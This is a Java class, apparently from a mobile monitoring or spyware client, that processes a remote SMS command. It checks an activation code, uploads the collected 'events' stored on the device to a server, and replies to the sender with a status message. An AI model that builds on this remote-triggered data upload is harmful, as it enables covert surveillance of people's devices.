package com.vvt.remotecommandmanager.processor.miscellaneous;

import java.util.concurrent.CountDownLatch;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.eventdelivery.EventDelivery;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class RequestEventsProcessor extends RemoteCommandProcessor {

	private static final String TAG = "RequestEventsProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private EventDelivery mEventDelivery;
	private LicenseInfo mLicenseInfo;
	
	private CountDownLatch mWaitForResponseLatch;
	private String mRecipientNumber;
	private String mReplyMessage = "Unknown";
	private boolean mIsSuccess = false;
	private StringBuilder mReplyMessageBuilder;
	
	public RequestEventsProcessor(AppContext appContext,FxEventRepository eventRepository,
			EventDelivery eventDelivery,LicenseInfo licenseInfo) {
		super(appContext,eventRepository);
		
		mLicenseInfo = licenseInfo;
		mEventDelivery = eventDelivery;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData) throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		mWaitForResponseLatch = new CountDownLatch(1);
		
		//Check command Data be fore process.
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		mEventDelivery.deliverRegularEvents(deliveryListener);
		
		//Block the thread and wait till onSuccess or onError called.
		try { mWaitForResponseLatch.await(); } catch (InterruptedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mIsSuccess);
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage);
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}
	
	DeliveryListener deliveryListener = new DeliveryListener() {
		
		@Override
		public void onProgress(DeliveryResponse response) {
			if(LOGD) FxLog.d(TAG, "onProgress # response.isSuccess : " + response.isSuccess());
		}
		
		@Override
		public void onFinish(DeliveryResponse response) {
			if(response != null) {
				if(response.isSuccess()) {
					mIsSuccess = true;
					mReplyMessageBuilder.append(MessageManager.REQUEST_EVENTS_SUCCESS);
				} else {
					mIsSuccess = false;
					mReplyMessageBuilder.append(RemoteCommandUtil.getErrorMessage(response));
				}
				
			}
			mWaitForResponseLatch.countDown();
		
		}
	};
	
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 arguments.
			if(commandData.getArguments().size() != 1 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		} 
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.ASYNC_HTTP;
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		ProcessingResult replyMessage = new ProcessingResult();
		replyMessage.setIsSuccess(mIsSuccess);
		replyMessage.setMessage(mReplyMessageBuilder.toString());
		return replyMessage;
	}
	
	
	/**=============================== for test =====================================**/
	
	/**TODO : delete when release.
	 * FOR TEST ONLY!!!
	 * @return
	 */
	public boolean isfinish() {
		if(!mReplyMessage.equals("Unknown")) {
			return true;
		}
		return false;
	}
	
	/**TODO : delete when release.
	 * FOR TEST ONLY!!!
	 * @return
	 */
	public String getMessage() {
		
		return mReplyMessage;
	}


}
